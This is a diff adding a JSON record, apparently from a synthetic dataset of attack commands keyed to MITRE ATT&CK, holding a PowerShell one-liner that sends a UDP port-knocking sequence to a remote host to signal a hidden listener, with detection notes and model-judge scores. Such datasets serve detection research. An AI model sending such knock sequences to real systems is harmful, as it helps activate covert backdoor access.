@@ -1,0 +1,38 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$target='203.0.113.20'; $udp=New-Object System.Net.Sockets.UdpClient; $signals=@(@{p=40001;d='knock1'}, @{p=40002;d='knock2'}, @{p=40003;d='open!'}); foreach($s in $signals){ $data=[Text.Encoding]::ASCII.GetBytes($s.d); $udp.Send($data,$data.Length,$target,$s.p) | Out-Null; Start-Sleep -Milliseconds 150 }; $udp.Close()",
+  "explanation": "Performs UDP-based port knocking with simple payloads as the signal to a remote listener that may enable access upon correct sequence. Detection: monitor for UDP packets to high, closed ports with small payloads in specific sequences; analyze NetFlow and IDS for repeated patterns from a single source.",
+  "rationale_steps": [
+    "Initialize a UDP client and define a knock sequence with payload markers.",
+    "Send short payloads to a series of high UDP ports as the activation signal.",
+    "Use minimal delays to preserve order without congestion.",
+    "Detect via IDS rules for repeated small UDP payloads to uncommon ports and firewall drop logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-a1c418fb-3570d564",
+  "source_prompt_hash": "a1c418fb",
+  "timestamp_utc": "2025-09-30T06:14:26.674858Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced quotes/braces, valid UdpClient usage, proper foreach structure, and correct method calls.",
+        "semantic_score": 5,
+        "semantic_justification": "It sends a timed sequence of UDP packets with small payloads to specific ports, implementing port knocking consistent with MITRE T1205 Traffic Signaling.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T19:07:48.134291Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
